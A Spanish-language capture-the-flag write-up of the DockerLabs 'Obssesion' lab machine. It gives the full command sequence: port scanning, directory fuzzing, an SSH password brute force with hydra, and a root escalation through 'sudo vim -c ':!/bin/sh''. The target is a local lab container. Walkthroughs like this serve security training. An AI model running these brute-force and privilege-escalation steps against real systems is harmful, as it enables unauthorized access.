## WRITEUP DE LA MÁQUINA OBSSESION DE DOCKERLABS EN ESPAÑOL

Sitio web - https://dockerlabs.es/#/

Hacemos un escaneo de puertos mediante la herramienta nmap, esto casi siempre es el comienzo para la resolución de una máquina o CTF.

```shell
└─$ nmap -sV -sC 172.17.0.2 -oN outputscan.txt
```
"-sC" Muestra la versión del servicio del puerto abierto.
<br><br>
"-sV" Ejecuta scripts propios de Nmap que, entre otras cosas, descubren información detallada sobre los servicios.
<br><br>
"172.17.0.2" Es la dirección IP de la máquina víctima.
<br><br>
"-oN outputscan.txt" Sirve para que te copie el resultado del escaneo en el fichero que tú le indiques (no hay que crearlo antes, lo crea solo). Esto lo hago por si más tarde quiero volver a ver el escaneo pero no quiero tener que hacerlo de nuevo.

En este caso no he utlizado ni "-p-", ni "-n", ni "--min-rate 5000" ya que me tardaba mucho hacer el escaneo y para algo tan sencillo es más eficaz y rapido ejecutar un comando más corto.

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 04:47 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00018s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```

Observamos que los puertos 21, 22 y 80 de los servicios ftp, ssh, http respectivamente estan abiertos, vamos a tirar por observar la dirección IP en algún buscador ya que el servicio http esta abierto. Vemos la siguiente página:
<br><br>
![foto de la pagina web](https://github.com/user-attachments/assets/63946c0e-9f99-43b0-86e5-13bdaec9e64c)
)
<br><br>
Mediante fuzzing web con la herramienta gobuster (hay más herramientas como wfuzz) vamos a buscar directorios ocultos en dicha página web. Ejecutamos:

```shell
└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
El modo dir indica que Gobuster realizará una enumeración de directorios y archivos.
"-u" Especifica la URL del objetivo que Gobuster escaneará. En este caso, el objetivo es http://172.17.0.2/.
<br><br>
"-w" Especifica la lista de palabras (wordlist) que Gobuster usará para la fuerza bruta. La lista de palabras contiene nombres de directorios y archivos comunes que Gobuster intentará encontrar en el servidor web. Aquí se está utilizando una lista de palabras proporcionada por DirBuster, llamada directory-list-2.3-medium.txt.
<br><br>
"-x" Especifica las extensiones de archivos que Gobuster intentará agregar a cada entrada en la lista de palabras. En este caso, Gobuster probará cada palabra con las extensiones .php Esto significa que si una entrada en la lista de palabras es admin, Gobuster probará admin.php

Obtenemos:
<br>

```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 301) [Size: 309] [--> http://172.17.0.2/backup/]
/important            (Status: 301) [Size: 312] [--> http://172.17.0.2/important/]
/server-status        (Status: 403) [Size: 275]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

Viendo los directorios ocultos del sitio web, probamos a meter en la url http://172.17.0.2/backup/ y nos muestra otra pagina con fichero llamado "Backup.txt"
<br><br>
![foto del fichero backup.txt](https://github.com/user-attachments/assets/10d75e0e-252f-40a6-a465-14bdf2f65887)
)
<br><br>
Si pinchamos en el, nos muestra una línea de texto que dice llamarse "russoski" como usuario. En el otro directorio llamada "important" encontramos un fichero .md donde hay un escrito sobre una historia de hacking, algo interesante pero nada relevante para el writeup.
<br><br>
![foto que muestra el nombre de usuario](https://github.com/user-attachments/assets/a32a3fab-06af-4d01-95d3-6cfdd6335965)
)
<br><br>
Sabiendo el nombre de usuario vamos a realizar un ataque de fuerza bruta con hydra al servicio ssh con nombre "russoski", usaremos la wordlits "rockyou.txt"
<br>
```sh
└─$ hydra -l russoski -P /home/kali/Desktop/rockyou.txt ssh://172.17.0.2/ -t 5
```
"-l russoski" Indica qué nombre de usuario va a usar en el ataque, en este caso buscamos a russoski.
<br><br>
"-P /home/kali/Desktop/rockyou.txt" Especifica la wordlist de contraseñas que va a usar para probar el ataque de fuerza bruta, cada uno pone la ruta donde se encuentre su fichero wordlist.
<br><br>
"ssh://172.17.0.2/" Especifica el protocolo y la dirección del objetivo del ataque. En este caso, se está atacando el servicio SSH (Secure Shell) en la dirección IP 172.17.0.2
<br><br>
"-t 5" Especifica el número de tareas (threads) paralelas que Hydra debe usar durante el ataque. En este caso, -t 5 indica que Hydra debe utilizar 5 hilos de ejecución simultáneos para probar las combinaciones de nombre de usuario y contraseña. (Nos va a tomar un par de minutos)

Este es el resultado:
<br>

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 11:45:10
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 50.00 tries/min, 50 tries in 00:01h, 14344349 to do in 4781:27h, 5 active
[STATUS] 35.00 tries/min, 105 tries in 00:03h, 14344294 to do in 6830:37h, 5 active

[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 11:48:32
```
Encontramos en la línea apartada (la he separado yo para que sea más legible), que la contraseña es "iloveme". Ahora toca mediante conexion ssh entrar al usuario russoski. Hay veces que se cierra la conexion con un WARNING: REMOTE  HOST IDENTIFICATION HAS CHANGED!, para solucionar solo hay que ejecutar el ssh con un sudo delante:
<br>

```
└─$ sudo ssh russoski@172.17.0.2
```
```
[sudo] password for kali: 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
russoski@1df4a6f0847e:~$ 
```
Toca escalar privilegios. Escribimos el comando "sudo -l" el cual  permite a un usuario verificar qué comandos tienen permiso para ejecutar como superusuario (o cualquier otro usuario especificado).

```
russoski@1df4a6f0847e:~$ sudo -l
Matching Defaults entries for russoski on 1df4a6f0847e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 1df4a6f0847e:
    (root) NOPASSWD: /usr/bin/vim
```
Ya sabemos que hacer, ir a la página GTFObins (https://gtfobins.github.io/#) para escalar privilegios en este caso con el binario "vim". Con buscar "vim" en el buscador de la página e ir al partado de sudo, encontramos nuestra forma de ser root, en este caso tendremos que ejecutar " sudo vim -c ':!/bin/sh' "

```
russoski@1df4a6f0847e:~$ sudo vim -c ':!/bin/sh'
# whoami
root
```
Ya somos root, espero que os haya gustado este writeup, muchas gracias!
